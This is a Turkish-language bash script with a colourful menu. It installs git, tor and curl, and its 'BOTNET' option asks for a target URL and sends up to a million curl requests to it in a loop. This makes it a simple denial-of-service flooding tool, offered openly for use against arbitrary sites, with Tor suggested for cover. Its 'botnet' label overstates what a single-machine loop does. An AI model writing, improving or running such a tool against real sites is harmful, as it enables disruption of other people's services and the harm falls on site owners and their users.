#! bin/bash 
clear
echo -e '\e[37m
    \     \  |    \      \  | ____|  \  | |   | 
   _ \     \ |   _ \    |\/ | __|     \ | |   | \e[31m
  ___ \  |\  |  ___ \   |   | |     |\  | |   | 
_/    _\_| \_|_/    _\ _|  _|_____|_| \_|\___/  
'
echo
sleep 0.5
echo -e '\e[36m              CODED BY STAR_SKY'
sleep 0.5
echo -e '\e[36m              TÜRKİYEM SİBER TİM'
sleep 0.5
echo -e '
\e[31m[\e[36m00\e[31m]\e[37mTOR SERVİSİNİ AKTİF ET
\e[31m[\e[36m01\e[31m]\e[37mTERMUX İÇİN GEREKSİNİMLER
\e[31m[\e[36m02\e[31m]\e[37mLİNUX İÇİN GEREKSİNİMLER
\e[31m[\e[36m03\e[31m]\e[37mBOTNET

\e[31m[\e[36m99\e[31m]\e[37mÇIKIŞ
'

read -p $'\e[34mSEÇİM YAPINIZ=\e[37m}' secim

if [[ $secim == 00 ]]; then
clear
echo -e '\e[37mAKTİF ETMEK İÇİN YENİ Bİ TERMİNAL EKRANI AÇIP \e[31mTOR \e[37m YAZINIZ...'
sleep 10.5
echo -e '\e[37mEMİN OLUNUZ!!!'
sleep 1

elif [[ $secim == 01 || $secim == 1 ]]; then
clear
echo -e '\e[31mKURULUM BAŞLADI...\e[37m'
pkg install git -y
pkg install tor -y
pkg install curl -y
echo -e '\e[31mKURULUM BİTTİ...'
sleep 1.1
bash türkiyemsibertim.sh

elif [[ $secim == 02 || $secim == 2 ]]; then
clear
echo -e '\e[31mKURULUM BAŞLADI...\e[37m'
sudo apt-get install git -y
sudo apt-get install tor -y
sudo apt-get install curl -y
echo -e '\e[31mKURULUM BİTTİ...'

elif [[ $secim == 03 || $secim == 3 ]]; then
clear
echo -e '\e[36m
 __ )   _ \__ __|  \  | ____|__ __| 
 __ \  |   |  |     \ | __|     |   
 |   | |   |  |   |\  | |       |   
____/ \___/  _|  _| \_|_____|  _|   

\e[31m{\e[37mCODED BY STAR_SKY\e[31m}
\e[31m{\e[37mBASH BETİK DİLİ İLE YAZILMIŞ BOTNET TOOLUDUR\e[31m}
'
read -p $'\e[34mLÜTFEN HEDEF URL Yİ YAZINIZ [örn = https://www.google.com] =}' botnet

web=0

while [ $web -lt 1000000 ]; do
	echo -e '\e[31m'
	echo -e PAKET GÖNDERİLDİ = $web
	let web=web+1
	echo -e '\e[37m'
	curl $botnet
done

elif [[ $secim == 99 ]]; then
clear
echo -e '\e[37mSTAR_SKY OLARAK İYİ GÜNLER DİLERİM...'
sleep 0.5
exit

else 
	clear	
	echo -e '\e[31mHATALI GİRİŞ YAPTINIZ!'
	sleep 1.1
	bash türkiyemsibertim.sh
fi
